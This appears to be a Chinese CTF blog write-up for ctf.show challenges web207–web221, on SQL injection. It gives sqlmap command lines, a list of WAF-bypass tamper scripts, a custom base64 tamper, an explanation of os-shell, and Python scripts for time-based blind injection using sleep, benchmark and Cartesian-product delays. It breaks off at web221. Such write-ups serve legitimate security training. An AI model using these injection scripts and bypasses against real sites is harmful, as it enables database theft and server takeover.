<p><code>python sqlmap.py -u http://.challenge.ctf.show:8080/api/index.php --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --method=PUT --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 -D &quot;ctfshow_web&quot; -T ctfshow_flaxc -C flagv --dump</code></p>
<h1 id="web207——sqlmap中tamper的使用"><a href="#web207——sqlmap中tamper的使用" class="headerlink" title="web207——sqlmap中tamper的使用"></a>web207——sqlmap中tamper的使用</h1><p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>
  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>使用tamper脚本修改注入数据:</strong><br><code>sqlmap -u &quot;xxx&quot; --tamper &#39;脚本名&#39;</code></p>
<pre><code>常见的tamper有：

apostrophemask.py     用utf8代替引号

equaltolike.py         MSSQL * SQLite中like 代替等号

greatest.py         MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号

space2hash.py         空格替换为#号 随机字符串 以及换行符

space2comment.py    用/**/代替空格

apostrophenullencode.py     MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号

halfversionedmorekeywords.py     当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论

space2morehash.py      MySQL中空格替换为 #号 以及更多随机字符串 换行符

appendnullbyte.p      Microsoft Access在有效负荷结束位置加载零字节字符编码

ifnull2ifisnull.py      MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤

space2mssqlblank.py  mssql空格替换为其它空符号

base64encode.py      用base64编码

space2mssqlhash.py mssql查询中替换空格

modsecurityversioned.py     mysql中过滤空格，包含完整的查询版本注释

space2mysqlblank.py      mysql中空格替换其它空白符号

between.py              MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）

space2mysqldash.py      MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）

multiplespaces.py      围绕SQL关键字添加多个空格

space2plus.py            用+替换空格

bluecoat.py           MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like

nonrecursivereplacement.py      双重查询语句。取代predefined SQL关键字with表示 suitable for替代

space2randomblank.py      代替空格字符（“”）从一个随机的空白字符可选字符的有效集

sp_password.py           追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾

chardoubleencode.py      双url编码(不处理以编码的)

unionalltounion.py           替换UNION ALL SELECT UNION SELECT

charencode.py           Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；

randomcase.py           Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写

unmagicquotes.py      宽字符绕过 GPC addslashes

randomcomments.py      用/**/分割sql关键字

charunicodeencode.py      ASP，ASP.NET中字符串 unicode 编码

securesphere.py       追加特制的字符串

versionedmorekeywords.py          MySQL &gt;= 5.1.13注释绕过

halfversionedmorekeywords.py      MySQL &lt; 5.1中关键字前加注释</code></pre><p>这里使用<code>space2comment</code>这个脚本，用<code>/**/</code>代替空格</p>
<p><code>python sqlmap.py -u &quot;http://c58a3bf4-e4a3-491c-b0ac-f51d484f077f.challenge.ctf.show:8080/api/index.php&quot; --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --cookie=&quot;PHPSESSID=vv1lcq36ru3v3hnu9qsk4mllub&quot; --method=&quot;PUT&quot; -headers=&quot;Content-Type:text/plain&quot; --safe-url=&quot;http://c58a3bf4-e4a3-491c-b0ac-f51d484f077f.challenge.ctf.show:8080/api/getToken.php&quot; --safe-freq=1 --tamper=space2comment.py --dump</code></p>
<h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>
<span class="token comment" spellcheck="true">// $id = str_replace('select', '', $id);</span>
  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤关键词，可以<strong>大小写</strong>绕过，用到<code>randomcase.py</code>，同时<code>space2comment.py</code>也得用上<code>--tamper=randomcase.py,space2comment.py</code></p>
<h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210812191229483.png" alt="image-20210812191229483"></p>
<p>这里是利用的/**/来代替的空格，但是此题被waf挡住了，我们换%0a，%09都可以<code>--tamper=&quot;tamper/space2comment.py&quot;</code></p>
<p>然后针对=的过滤，需要添加以下内容：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1 id="web210-212"><a href="#web210-212" class="headerlink" title="web210-212"></a>web210-212</h1><p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对查询字符进行解密</span>
  <span class="token keyword">function</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对你输入的id有解密处理，所以需要自行加密，同时对返回值过滤空格*号，需要用%09来代替即可</p>
<p><code>--tamper=web212</code>即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210812221751652.png" alt></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> xrange
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
<span class="token keyword">import</span> base64
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW


<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    retVal <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> retVal

<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token operator">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token operator">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token operator">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token operator">and</span> <span class="token operator">not</span> doublequote <span class="token operator">and</span> <span class="token operator">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web213——os-shell"><a href="#web213——os-shell" class="headerlink" title="web213——os-shell"></a>web213——os-shell</h1><pre class="line-numbers language-php"><code class="language-php">练习使用<span class="token operator">--</span>os<span class="token operator">-</span>shell 一键getshell

<span class="token comment" spellcheck="true">//对查询字符进行解密</span>
  <span class="token keyword">function</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>原理大致是：</strong><br>用into outfile函数将一个可以用来上传的php文件写到网站的根目录下，之后再上传一个文件，这个文件可以用来执行系统命令，并且将结果返回出来</p>
<p><strong>os-shell的使用条件</strong><br>（1）网站必须是root权限<br>（2）攻击者需要知道网站的绝对路径<br>（3）GPC为off，php主动转义的功能关闭</p>
<h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><p>有两个post注入点：ip&amp;debug</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/8/13 20:01</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://42ef38fd-35c5-4cb5-ae0a-658cbd6d58e2.challenge.ctf.show:8080/api/"</span>

flag <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment" spellcheck="true"># 查库名</span>
        payload <span class="token operator">=</span> <span class="token string">"database()"</span>
        <span class="token comment" spellcheck="true"># 查表名字</span>
        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment" spellcheck="true"># 查列名字-id.flag</span>
        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>
        <span class="token comment" spellcheck="true"># 查数据</span>
        <span class="token comment" spellcheck="true"># payload = "select flaga from ctfshow_flagx"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"if(ascii(substr(({payload}),{i},1))>{mid},sleep(1.5),1)"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><p>闭合单引号即可：</p>
<pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1.5),1) and '1'='1"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>
        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php">       where id <span class="token operator">=</span> <span class="token function">from_base64</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>需要闭合</strong></p>
<pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"'MQ==') or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1.5),1"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>
        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>最终格式</strong></p>
<pre class="line-numbers language-php"><code class="language-php">where id <span class="token operator">=</span> <span class="token function">from_base64</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">{</span>i<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">{</span>mid<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><p>关于benchmark函数，他会造成一个简单的时间延迟，同时网上还流传利用benchmark函数进行ddos攻击，是想让数据库超负荷，也算是比较新鲜的一个函数，比较好理解</p>
<p><strong><a href="https://blog.csdn.net/weixin_36276175/article/details/113295236" target="_blank" rel="noopener">MySQL中benchmark_MYSQL中BENCHMARK函数的利用</a></strong></p>
<p><strong>关键语句</strong></p>
<pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1) or if(ascii(substr(({payload}),{i},1))>{mid},benchmark(100000,md5(1)),1"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>
        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><p><a href="https://www.cnblogs.com/forforever/p/13019703.html" target="_blank" rel="noopener">MySQL时间盲注五种延时方法</a></p>
<pre class="line-numbers language-mysql"><code class="language-mysql"> 笛卡尔积（多表联合查询）(因为连接表是一个很耗时的操作)
     AxB=A和B中每个元素的组合所组成的集合，就是连接表
     SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
     select * from table_name A, table_name B
     select * from table_name A, table_name B，table_name C
     select count(*) from table_name A, table_name B，table_name C  表可以是同一张表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>重点在很耗时，所以说可以利用这一点特性，将多表联合查询放在原来sleep的位置，就可以同样有睡眠的效果</p>
<p><strong>脚本</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time
url<span class="token operator">=</span><span class="token string">"http://6b39c9d3-3c24-432b-abfd-735534f0e5cf.challenge.ctf.show:8080/api/"</span>
letter<span class="token operator">=</span><span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-,{_}"</span> <span class="token comment" spellcheck="true">#最后跑flag时去掉"_"</span>
flag<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>

        <span class="token comment" spellcheck="true">#payload="1) or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like '{}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)-- -".format(flag+j)</span>
        <span class="token comment" spellcheck="true">#payload="1) or if((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc') like '{}%',(select count(*) from information_schema.columns A, information_schema.columns B),0) -- +".format(flag+j)</span>
        payload<span class="token operator">=</span><span class="token string">"1) or if((select group_concat(flagaac) from ctfshow_flagxc) like '{}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)-- -"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>     
            <span class="token string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>
        <span class="token punctuation">}</span>

        <span class="token comment" spellcheck="true">#print(res)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.15</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            flag<span class="token operator">+=</span>j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> 
            <span class="token keyword">break</span>      
        <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#遍历letter中一个字符就停止0.2s      </span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#正确匹配到一个字符就停止1s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web219-web220"><a href="#web219-web220" class="headerlink" title="web219-web220"></a>web219-web220</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time
url<span class="token operator">=</span><span class="token string">"/api/index.php"</span>
letter<span class="token operator">=</span><span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-,{}"</span> <span class="token comment" spellcheck="true">#最后跑flag时去掉"_"</span>
flag<span class="token operator">=</span><span class="token string">"ctfshow{45835205-bd93-40ff-9d71-"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        
        <span class="token comment" spellcheck="true">#payload="1) or if((table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}%',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1)-- -".format(flag+j)</span>
        <span class="token comment" spellcheck="true">#payload="1) or if((select column_name from information_schema.columns where table_name='ctfshow_flagxcac') like '{}%',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),0) -- +".format(flag+j)</span>
        payload<span class="token operator">=</span><span class="token string">"1) or if((select flagaabcc from ctfshow_flagxcac) like '{}%',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)-- -"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>     
            <span class="token string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span> 
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>
        <span class="token punctuation">}</span>
        <span class="token comment" spellcheck="true">#print(payload)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.15</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            flag<span class="token operator">+=</span>j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> 
            <span class="token keyword">break</span>      
        <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true">#print(res)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#遍历letter中一个字符就停止1s      </span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#正确匹配到一个字符就停止1s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web221——Limit注入"><a href="#web221——Limit注入" class="headerlink" title="web221——Limit注入"></a>web221——Limit注入</h1><p><a href="https://www.jianshu.com/p/6c1420a7a7d9" target="_blank" rel="noopener">Mysql 注入之 limit 注入</a></p>
<p><strong>查询语句</strong></p>
